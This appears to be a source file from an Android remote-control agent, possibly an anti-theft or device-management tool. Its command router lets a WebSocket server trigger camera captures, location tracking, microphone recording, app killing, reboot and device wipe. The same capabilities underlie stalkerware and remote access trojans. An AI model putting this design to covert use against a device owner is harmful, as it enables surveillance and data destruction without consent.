package com.sentrix.agent

import android.content.Context
import android.media.AudioManager
import android.util.Log
import com.sentrix.agent.commands.*
import com.sentrix.agent.network.WebSocketClient
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import org.json.JSONObject

/**
 * CommandRouter — the brain of the agent.
 *
 * Receives (action, params) from the WebSocket, dispatches to the right
 * command handler, and sends the result JSON back up the socket.
 *
 * Adding a new command:
 *  1. Add the action string to the when() block below
 *  2. Implement the handler in the relevant Commands file
 *  3. That's it — no other wiring needed
 */
class CommandRouter(
    private val context: Context,
    private val wsClient: WebSocketClient
) {
    private val TAG   = "CommandRouter"
    private val scope = CoroutineScope(Dispatchers.IO)

    fun dispatch(action: String, params: JSONObject) {
        Log.i(TAG, "Dispatching: $action")

        // Simple (non-suspend) commands run inline and return a string result
        // Async (camera, location) commands are launched as coroutines and
        // send their result back via wsClient.send() themselves

        scope.launch {
            val result: String? = when (action) {

                // ── Connectivity ──────────────────────────────────────────────
                "wifi_on"         -> ConnectivityCommands.wifiOn(context)
                "wifi_off"        -> ConnectivityCommands.wifiOff(context)
                "data_on"         -> ConnectivityCommands.dataOn()
                "data_off"        -> ConnectivityCommands.dataOff()
                "hotspot_on"      -> ConnectivityCommands.hotspotOn()
                "hotspot_off"     -> ConnectivityCommands.hotspotOff()
                "airplane_on"     -> ConnectivityCommands.airplaneOn()
                "airplane_off"    -> ConnectivityCommands.airplaneOff()
                "bt_on"           -> ConnectivityCommands.bluetoothOn()
                "bt_off"          -> ConnectivityCommands.bluetoothOff()

                // ── Camera (async — sends result itself) ──────────────────────
                "front_cam"       -> {
                    CameraCommands.capture(context, useFront = true,  wsClient = wsClient)
                    null   // result sent internally
                }
                "rear_cam"        -> {
                    CameraCommands.capture(context, useFront = false, wsClient = wsClient)
                    null
                }

                // ── Location (async) ──────────────────────────────────────────
                "track_location"  -> {
                    LocationCommands.trackLocation(context, wsClient)
                    null
                }

                // ── Microphone ────────────────────────────────────────────────
                "mic_start"       -> AudioCommands.startMicRecord(context)
                "mic_stop"        -> AudioCommands.stopMicRecord(wsClient)

                // ── System ────────────────────────────────────────────────────
                "torch_on"        -> SystemCommands.torchOn(context)
                "torch_off"       -> SystemCommands.torchOff(context)
                "vibrate"         -> SystemCommands.vibrate(context)
                "screen_on"       -> SystemCommands.screenOn()
                "screen_off"      -> SystemCommands.screenOff()
                "lock_screen"     -> SystemCommands.lockScreen(context)
                "loud_alarm"      -> SystemCommands.loudAlarmOn(context)

                "vol_ring_max"    -> SystemCommands.setVolume(context, AudioManager.STREAM_RING,  15)
                "vol_ring_zero"   -> SystemCommands.setVolume(context, AudioManager.STREAM_RING,  0)
                "vol_media_max"   -> SystemCommands.setVolume(context, AudioManager.STREAM_MUSIC, 15)
                "vol_media_zero"  -> SystemCommands.setVolume(context, AudioManager.STREAM_MUSIC, 0)

                // ── Root-only system ──────────────────────────────────────────
                "kill_all_apps"   -> SystemCommands.killAllApps()
                "reboot"          -> SystemCommands.reboot()
                "wipe_device"     -> SystemCommands.wipeDevice()

                "kill_app"        -> {
                    val pkg = params.optString("package", "")
                    if (pkg.isNotBlank()) SystemCommands.killApp(pkg)
                    else "Missing package param"
                }

                "clear_app_data"  -> {
                    val pkg = params.optString("package", "")
                    if (pkg.isNotBlank()) SystemCommands.clearAppData(pkg)
                    else "Missing package param"
                }

                // ── Unknown ───────────────────────────────────────────────────
                else -> {
                    Log.w(TAG, "Unknown action: $action")
                    "Unknown action: $action"
                }
            }

            // For commands that returned a string, wrap and send it
            if (result != null) {
                val json = JSONObject().apply {
                    put("type",      "result")
                    put("action",    action)
                    put("message",   result)
                    put("success",   !result.lowercase().contains("fail")
                                  && !result.lowercase().contains("requires")
                                  && !result.lowercase().contains("error"))
                    put("timestamp", System.currentTimeMillis())
                }
                wsClient.send(json)
            }
        }
    }
}
